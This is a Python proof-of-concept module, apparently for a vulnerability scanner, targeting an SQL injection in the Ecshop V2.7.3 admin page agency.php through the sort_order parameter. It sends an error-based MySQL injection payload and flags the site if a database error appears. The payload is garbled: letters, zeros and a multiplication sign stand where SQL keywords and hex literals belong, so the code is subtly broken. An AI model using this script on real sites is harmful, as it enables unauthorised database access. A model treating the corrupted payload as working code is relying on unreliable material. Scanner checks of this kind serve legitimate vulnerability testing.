# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0021_L'  # 平台漏洞编号，留空
    name = 'Ecshop V2.7.3版本SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-15'  # 漏洞公布时间
    desc = '''
        漏洞存在upload/admin/agency.php中，
        $filter['sort_by'] = empty($_REQUEST['sort_by']) ? 'agency_id' : trim($_REQUEST['sort_by']);//未过滤
        $filter['sort_order'] = empty($_REQUEST['sort_order']) ? 'DESC' : trim($_REQUEST['sort_order']);//未过滤
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2289/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = 'V2.7.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd57d1773-50bc-4b31-8f3c-cba6e66af60b'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 需要注册用户，后台注入
            payload = "/upload/admin/agency.php"
            data = "act=query&sort_by=agency_id&sort_order=-1 0R (SELECT 6339 FROM(SELECT COUNT(*),CONCAT(O×7165777771,(SELECT (CASE WHEN (6339=6339) THEN 1 ELSE O END)),O×716f787071,FL00R(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
            url = self.target + payload
            r = requests.post(url, data=data)

            if 'MySQL server errorreport' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
